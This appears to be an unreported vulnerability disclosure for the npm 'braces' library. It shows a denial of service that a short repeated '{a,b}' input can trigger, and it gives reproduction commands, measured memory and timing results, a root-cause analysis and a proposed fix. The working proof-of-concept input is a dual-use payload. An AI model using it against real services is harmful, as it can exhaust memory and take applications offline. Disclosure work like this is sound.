# CVE-CANDIDATE: Denial of Service in braces via Comma-Separated Brace Expansion

**Package:** [braces](https://github.com/micromatch/braces) (npm)  
**Version:** 3.0.3 (latest)  
**Severity:** HIGH (CVSS 7.5)  
**CWE:** CWE-400 Uncontrolled Resource Consumption  
**Status:** Unreported  

---

## Vulnerability

The `braces` library is vulnerable to denial of service through uncontrolled resource consumption when processing comma-separated brace expansion patterns.

A malicious input as short as **110 characters** causes the library to materialize **4.2 million items** in memory, consuming **1.2GB of RAM** and blocking the CPU for **18+ seconds**.

This is an incomplete fix for [CVE-2024-4068](https://github.com/advisories/GHSA-4g82-wqcq-rhqv). The original patch limited input length to 10,000 characters but did not limit the combinatorial output of comma-separated expansions.

## Impact

`braces` is a dependency of `micromatch`, which is used by:

- **webpack** (bundler)
- **vitest** (test runner)
- **jest** (test runner)
- **eslint** (linter)
- **chokidar** (file watcher)
- Hundreds of other tools

Any application that passes user-controlled input to `braces.expand()` is vulnerable.

## Root Cause

In `lib/expand.js`, the `rangeLimit` guard only checks numeric ranges (`{1..1000}`), not comma-separated patterns (`{a,b}`):

```javascript
// lib/expand.js:57
if (node.ranges > 0) {  // ← only numeric ranges are checked
  if (utils.exceedsLimit(...args, options.step, rangeLimit)) {
    throw new RangeError('...');
  }
}
// Comma-separated expansions skip this check entirely
```

The `append()` function recursively builds all 2^N combinations into an array with no output limit.

## Proof of Concept

### Quick Test

```bash
cd targets/braces/repo && npm install
node -e "
const braces = require('./');
const input = '{a,b}'.repeat(22);  // 110 characters
console.time('expand');
const result = braces.expand(input);
console.timeEnd('expand');
console.log('Items:', result.length.toLocaleString());
"
```

### Full PoC Script

```bash
python3 targets/braces/poc_braces_dos.py
```

### Test Results

| Input (chars) | Output Items | Time | Memory |
|---------------|-------------|------|--------|
| 50 | 1,024 | 9ms | +1MB |
| 75 | 32,768 | 206ms | +11MB |
| 90 | 262,144 | 1.4s | +118MB |
| 95 | 524,288 | 3s | +184MB |
| 100 | 1,048,576 | 4.2s | +468MB |
| 110 | 4,194,304 | 18s | +1,219MB |
| 125 | — | TIMEOUT | OOM |

## Recreate from Scratch

```bash
# 1. Clone the braces repo
git clone https://github.com/micromatch/braces.git
cd braces

# 2. Install dependencies
npm install

# 3. Verify the version
node -e "console.log(require('./package.json').version)"
# Should print: 3.0.3

# 4. Run the quick DoS test
node -e "
const braces = require('./');
const input = '{a,b}'.repeat(22);
console.time('expand');
const result = braces.expand(input);
console.timeEnd('expand');
console.log('Items:', result.length.toLocaleString());
"

# 5. Run the full PoC
python3 /home/kali/cve-workspace/targets/braces/poc_braces_dos.py
```

## Affected Code Path

```
braces.expand(input)
  → lib/expand.js:walk()
    → lib/expand.js:append()  ← no output limit
      → recursively builds all 2^N combinations
        → returns massive array
```

## Recommended Fix

Add an output limit check in `lib/expand.js` before the `append()` call:

```javascript
// After line 57, before append:
const estimatedSize = Math.pow(2, node.commas + 1);
if (estimatedSize > rangeLimit) {
  throw new RangeError('expanded array length exceeds range limit');
}
```

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-07-17 | Vulnerability discovered |
| — | Report to micromatch maintainers |
| — | 90-day coordinated disclosure |

## Files

| File | Description |
|------|-------------|
| `poc_braces_dos.py` | Working PoC script |
| `findings.md` | Detailed vulnerability analysis |
| `verdict.md` | Confirmation and CVSS score |
| `disclosure-report.md` | Ready-to-submit advisory |
| `repo/` | Cloned braces@3.0.3 source |

## License

This research is provided as-is for responsible disclosure purposes.
